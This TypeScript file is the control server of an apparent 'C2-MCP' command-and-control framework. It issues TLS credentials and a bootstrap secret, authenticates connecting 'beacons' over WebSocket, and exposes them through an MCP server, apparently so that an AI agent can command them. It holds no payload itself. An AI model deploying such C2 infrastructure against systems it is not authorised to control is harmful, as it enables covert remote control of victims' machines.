import { defineCommand, runMain } from "citty";
import { logger } from "../lib/logger.ts";
import { generateIdentity, encodeBootstrapSecret } from "../lib/crypto.ts";
import type { CryptoIdentity } from "../lib/crypto.ts";
import type { AuthMessage, ControlMessage } from "../lib/protocol.ts";
import { startMcpServer } from "./mcp-server.ts";
import {
    registerBeacon,
    removeBeacon,
    handleBeaconResponse,
} from "./beacons.ts";
import type { BeaconWSData } from "./beacons.ts";
import {
    DEFAULT_MCP_LISTEN,
    DEFAULT_CONTROL_LISTEN,
} from "../lib/constants.ts";

const main = defineCommand({
    meta: { name: "control", description: "C2-MCP Control server" },
    args: {
        "mcp-listen": {
            type: "string",
            default: DEFAULT_MCP_LISTEN,
            description: "MCP Server listen address (host:port)",
        },
        "control-listen": {
            type: "string",
            default: DEFAULT_CONTROL_LISTEN,
            description: "Beacon WSS listen address (host:port)",
        },
        verbose: {
            type: "boolean",
            alias: "v",
            default: false,
            description: "Enable verbose logging",
        },
    },
    async run({ args }) {
        if (args.verbose) {
            logger.level = 5; // verbose
        }

        // --- Generate crypto identity ---
        logger.info("Generating crypto identity...");
        const identity = await generateIdentity();
        const bootstrapSecret = encodeBootstrapSecret(
            identity.authToken,
            identity.fingerprint,
        );
        logger.info(`Certificate fingerprint: ${identity.fingerprint}`);
        logger.info(`Bootstrap secret: ${bootstrapSecret}`);

        // --- Start MCP HTTP Server ---
        const [mcpHost, mcpPort] = splitHostPort(args["mcp-listen"]);
        await startMcpServer(mcpHost, mcpPort);

        // --- Start Control WSS Server ---
        const [ctrlHost, ctrlPort] = splitHostPort(args["control-listen"]);

        startControlServer(identity, ctrlHost, ctrlPort);
        logger.info(
            `Control WSS server listening on wss://${ctrlHost}:${ctrlPort}`,
        );
    },
});

function splitHostPort(addr: string): [string, number] {
    const idx = addr.lastIndexOf(":");
    if (idx === -1) throw new Error(`Invalid address: ${addr}`);
    const port = Number(addr.slice(idx + 1));
    if (!Number.isInteger(port) || port <= 0 || port > 65535) {
        throw new Error(`Invalid port in address: ${addr}`);
    }
    return [addr.slice(0, idx), port];
}

function startControlServer(
    identity: CryptoIdentity,
    host: string,
    port: number,
) {
    const authTokenHex = identity.authToken.toString("hex");

    Bun.serve<BeaconWSData>({
        hostname: host,
        port,
        tls: {
            cert: identity.cert,
            key: identity.key,
        },
        // Phase 1: HTTPS GET /cert returns the PEM certificate
        async fetch(req, server) {
            const url = new URL(req.url);

            if (url.pathname === "/cert" && req.method === "GET") {
                logger.debug("Serving certificate to beacon (phase 1)");
                return new Response(identity.cert, {
                    headers: { "Content-Type": "application/x-pem-file" },
                });
            }

            // Phase 2: WebSocket upgrade
            if (url.pathname === "/ws") {
                const upgraded = server.upgrade(req, {
                    data: { authenticated: false },
                });
                if (!upgraded) {
                    return new Response("WebSocket upgrade failed", {
                        status: 400,
                    });
                }
                return undefined;
            }

            return new Response("Not found", { status: 404 });
        },
        websocket: {
            open() {
                logger.debug("New WebSocket connection, awaiting auth...");
            },
            message(ws, message) {
                const data = ws.data!;
                const raw =
                    typeof message === "string"
                        ? message
                        : new TextDecoder().decode(message);

                if (data.authenticated) {
                    // Authenticated — handle command responses
                    handleBeaconResponse(raw);
                    return;
                }

                // Not authenticated — expect AuthMessage
                let authMsg: AuthMessage;
                try {
                    authMsg = JSON.parse(raw);
                } catch {
                    ws.close(1008, "Invalid auth message");
                    return;
                }

                if (authMsg.type !== "auth" || !authMsg.token || !authMsg.id) {
                    ws.close(1008, "Invalid auth message format");
                    return;
                }

                if (authMsg.token !== authTokenHex) {
                    const resp: ControlMessage = {
                        type: "auth_result",
                        ok: false,
                        error: "Invalid auth token",
                    };
                    ws.sendText(JSON.stringify(resp));
                    ws.close(1008, "Auth failed");
                    return;
                }

                const ok = registerBeacon(authMsg.id, ws, authMsg.info);
                if (!ok) {
                    const resp: ControlMessage = {
                        type: "auth_result",
                        ok: false,
                        error: `Device ID already connected: ${authMsg.id}`,
                    };
                    ws.sendText(JSON.stringify(resp));
                    ws.close(1008, "Duplicate ID");
                    return;
                }

                data.authenticated = true;
                data.beaconId = authMsg.id;
                const resp: ControlMessage = { type: "auth_result", ok: true };
                ws.sendText(JSON.stringify(resp));
                logger.info(`Beacon authenticated: ${authMsg.id}`);
                return;
            },
            close(ws) {
                const beaconId = ws.data?.beaconId;
                if (beaconId) {
                    removeBeacon(beaconId);
                }
            },
        },
    });
}

runMain(main);
